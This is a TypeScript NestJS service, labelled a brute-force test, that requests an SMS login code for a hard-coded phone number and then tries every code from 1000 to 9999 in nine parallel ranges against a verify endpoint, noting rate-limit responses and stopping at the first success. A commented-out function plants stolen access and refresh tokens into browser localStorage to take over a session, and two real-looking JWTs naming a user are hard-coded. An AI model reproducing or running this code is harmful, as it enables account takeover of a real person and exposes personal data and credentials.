import { map } from 'rxjs/operators';
import { Injectable, Logger } from '@nestjs/common';
import axios, { AxiosError } from 'axios';

const delay = (ms: number) => new Promise(r => setTimeout(r, ms));

const listBrut: { start: number; end: number }[] = [
  {
    start: 1000,
    end: 2000,
  },
  {
    start: 2000,
    end: 3000,
  },
  {
    start: 3000,
    end: 4000,
  },
  {
    start: 4000,
    end: 5000,
  },
  {
    start: 5000,
    end: 6000,
  },
  {
    start: 6000,
    end: 7000,
  },
  {
    start: 7000,
    end: 8000,
  },
  {
    start: 8000,
    end: 9000,
  },
  {
    start: 9000,
    end: 9999,
  },
];

@Injectable()
export class BruteForceTestService {
  private readonly logger = new Logger('BruteForceTest');

  private readonly baseUrl = process.env.AUTH_BASE_URL!;
  private readonly phone = '09221371743';

  private async runRange(start: number, end: number, controller: AbortController): Promise<any> {
    for (let code = start; code <= end; code++) {
      if (controller.signal.aborted) {
        throw new Error('ABORTED');
      }

      try {
        const res = await axios({
          method: 'POST',
          url: `${this.baseUrl}/login/verify-code/`,
          headers: {
            'Content-Type': 'application/json',
          },
          data: {
            phone_number: this.phone,
            code: String(code),
            email: null,
            first_name: null,
            last_name: null,
          },
        });
        controller.abort();
        return { code, ...res.data };
      } catch (err) {
        const error = err as AxiosError;

        if (controller.signal.aborted) {
          throw err;
        }

        if (error.response?.status === 429) {
          this.logger.warn({
            code,
            status: 429,
            message: 'RATE_LIMIT_TRIGGERED',
          });
        }
        this.logger.warn(code);
      }
    }

    throw new Error('NOT_FOUND_IN_RANGE');
  }

  async run(): Promise<{ done: boolean; data?: any }> {
    try {
      // 1️⃣ send code
      await axios.post(`${this.baseUrl}/login/send-code/`, { phone_number: this.phone });

      // 2️⃣ shared abort controller
      const controller = new AbortController();

      // 3️⃣ concurrent execution
      const tasks = listBrut.map(({ start, end }) => this.runRange(start, end, controller));

      // 4️⃣ اولین success برنده است
      const result = await Promise.any(tasks);

      return {
        done: true,
        data: result,
      };
    } catch (err) {
      if ((err as any)?.errors) {
        // Promise.any failed (no success)
        return { done: false };
      }

      const error = err as AxiosError;
      this.logger.error({
        message: 'RUN_FAILED',
        status: error.response?.status,
        data: error.response?.data,
      });

      return { done: false };
    }
  }
}

// function replaceTokens(accessToken, refreshToken) {
//   // 1️⃣ auth-storage
//   const authRaw = localStorage.getItem('auth-storage');
//   if (authRaw) {
//     try {
//       const auth = JSON.parse(authRaw);

//       if (auth?.state) {
//         auth.state.accessToken = accessToken;
//         auth.state.refreshToken = refreshToken;
//         auth.state.isLoggedIn = true;
//       }

//       localStorage.setItem('auth-storage', JSON.stringify(auth));
//     } catch (e) {
//       console.error('auth-storage parse failed', e);
//     }
//   }

//   // 2️⃣ freelancer
//   const freelancerRaw = localStorage.getItem('freelancer');
//   if (freelancerRaw) {
//     try {
//       const freelancer = JSON.parse(freelancerRaw);
//       freelancer.token = accessToken;
//       localStorage.setItem('freelancer', JSON.stringify(freelancer));
//     } catch (e) {
//       console.error('freelancer parse failed', e);
//     }
//   }

//   // 3️⃣ token (plain)
//   localStorage.setItem('token', accessToken);

//   // 4️⃣ refreshToken (plain)
//   localStorage.setItem('refreshToken', refreshToken);
// }

// replaceTokens(
//   'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwidXNlcl9pZCI6MjcsImV4cCI6MTc2Nzk0Mjc2OSwiaWF0IjoxNzY2NzMzMTY5LCJpc19mcmVlbGFuY2VyIjpmYWxzZSwibmFtZSI6InplaW5hYiBraGFrcG91ciJ9.mXuhVr5x9WjZedM9t-xkS5Q4TXY-1XDFHCUdJADWq-0',
//   'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsInVzZXJfaWQiOjI3LCJleHAiOjE3NjkxNTIzNjksImlhdCI6MTc2NjczMzE2OSwiaXNfZnJlZWxhbmNlciI6ZmFsc2UsIm5hbWUiOiJ6ZWluYWIga2hha3BvdXIifQ.pQhVabhkQxLVeHR8z9pTiyfNZ68dYRS1eL57xMUQZt0'
// );
